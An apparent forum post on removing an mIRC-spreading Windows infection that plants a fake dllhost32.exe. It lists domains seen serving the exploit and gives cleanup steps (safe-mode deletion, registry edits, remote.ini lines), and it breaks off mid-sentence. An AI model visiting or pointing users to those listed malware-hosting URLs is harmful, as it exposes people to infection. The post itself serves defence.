i've seen this vuln being exploited on the following urls
*brasky.com* *ilwig.net/rofl.swf* *sillyu.afraid.org*
*preview.ampuh.info* *just4fun.afraid.org* *nowim.4t3.com*
*goten007.cjb.net*

depending on what version of windows you run, you may also need to
remove other files (ie - c:\windows\prefetch\dllhost32.exe*, and
possibly from dllcache). you may have to delete these files in safe
mode. to quote rats:
"its in remotes in mirc, and you delete dllhost32.exe in safemode.
dllhost32.exe is a fake bin, the real one is dllhost.exe, and you
delete 2 strings in regedit wich shows dllhost32.exe "as" the real
one and then you are done "

it also puts lines in mirc remote.ini

i have also been told of another possible variant, discussed here:
